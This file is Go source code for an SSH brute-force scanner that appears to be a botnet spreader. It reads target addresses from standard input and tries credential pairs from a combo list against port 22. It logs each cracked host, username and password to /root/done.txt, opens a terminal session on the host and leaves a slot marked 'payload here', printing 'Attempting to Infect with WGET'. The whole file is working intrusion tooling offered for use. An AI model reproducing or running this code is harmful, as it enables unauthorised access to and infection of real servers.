package main

import
(
    "golang.org/x/crypto/ssh"
	"os"
	"strings"
	"sync"
	"bufio"
    "fmt"

)


var (
	Completed bool = false
	ipaddrs = []string{} 
	group sync.WaitGroup
)


func high(address string, username string, password string) {
	
		sshConfig := &ssh.ClientConfig{
			User: username,
			Auth: []ssh.AuthMethod{
				ssh.Password(password)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		
		}

		connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", address, 22), sshConfig)
		if err != nil {
			group.Done()
			return
		}
		
		
		
		
		for v:= range ipaddrs {				
			if address == ipaddrs[v] {
				ipaddrs = append(ipaddrs, address) 
				group.Done()
				return
			}
		}
		

		
		ipaddrs = append(ipaddrs, address) 
		
		save_file, err := os.OpenFile("/root/done.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
        if err != nil {
            group.Done()
			return
        }
		
		
        defer save_file.Close()
		
        string := fmt.Sprintf("%s:%s:%s\n", address, username, password)
        _, err = save_file.WriteString(string)
        if err != nil {
			group.Done()
			return
        }
		
		session, err := connection.NewSession()
		if err != nil {
			group.Done()
			return 
		}	

		modes := ssh.TerminalModes{
			ssh.ECHO:          0,     
			ssh.TTY_OP_ISPEED: 14400, 
			ssh.TTY_OP_OSPEED: 14400, 
		}
	
		if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
			session.Close()
			group.Done()
			return 
		}
		
		
		
		
		fmt.Printf("\x1b[32m%s:22 %s:%s - Successfully Bruted \n\x1b[37m", address, username, password)

		
		session.Run("") // payload here

		
		
		fmt.Printf("\x1b[32m%s - Attempting to Infect with WGET\n\x1b[37m", address)
		
		
		session.Close()
		group.Done()
		return 
}

func main() {
        fmt.Printf("\x1b[31mScanner Started, Reading Stdin\r\n")
    for { // 20k is ur daddy - @urharmful try to remove ur dead
		reader := bufio.NewReader(os.Stdin)
        address := bufio.NewScanner(reader)
        for address.Scan() {
				combo, err := os.Open("combo.txt")
				if err != nil {
					fmt.Printf("\x1b[31m[ERROR] [%s]\n", err)
				}
				
				defer combo.Close()
				comboscan := bufio.NewScanner(bufio.NewReader(combo))
				comboscan.Split(bufio.ScanLines)
				for comboscan.Scan(){
					combo := strings.Split(comboscan.Text(), " ")
					group.Add(1)
					go high(address.Text(), combo[0], combo[1])	
				}
		}
	}
}